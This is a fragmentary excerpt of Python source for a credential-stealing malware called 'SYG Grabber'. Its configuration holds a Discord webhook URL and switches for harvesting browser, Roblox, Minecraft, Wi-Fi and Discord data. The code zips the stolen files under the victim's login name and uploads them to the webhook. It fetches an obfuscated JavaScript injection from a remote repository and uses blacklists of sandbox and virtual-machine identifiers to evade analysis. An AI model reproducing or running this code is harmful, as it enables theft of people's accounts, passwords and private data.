...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1327515322927812669/_YOP6h3xBX17LQOcGOPS-t96dsCIyuHsrLTrg4QC5TCgSAOGqTuFEqNeDaLVt6ZHvbld', 'ping': False, 'pingtype': 'Here', 'error': False, 'startup': False, 'defender': False, 'systeminfo': True, 'backupcodes': False, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': False}
...
def main(webhook: str):
    ...
    _file = f'{localappdata}\\SYG-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'SYG-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'SYG-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "SYG Grabber | Created By DADDY Director"
                    },
                    "thumbnail": {
...
class Injection:
    def __init__(self, webhook: str) -> None:
        ...
        self.code = requests.get('https://raw.githubusercontent.com/Smug246/SYG-injection/main/obfuscated-injection.js').text
...
class Debug:
    ...
    def checks(self):
        ...
        self.blackListedUsers = [
            ...
            'User01', 'test', 'RGzcBUyrznReg', 'Lucas' ]
        self.blackListedPCNames = [
            ...
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'DESKTOP-5L5D6Q7']
        self.blackListedHWIDS = [
            ...
            'FEC0B3B8-9887-11E4-8B9B-08041D181500']
        self.blackListedIPS = [
            ...
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '69.46.210.112']
        self.blackListedMacs = [
            ...
            '00:e0:4c:cb:62:08', 'E0-46-EE-12-BE-E1']
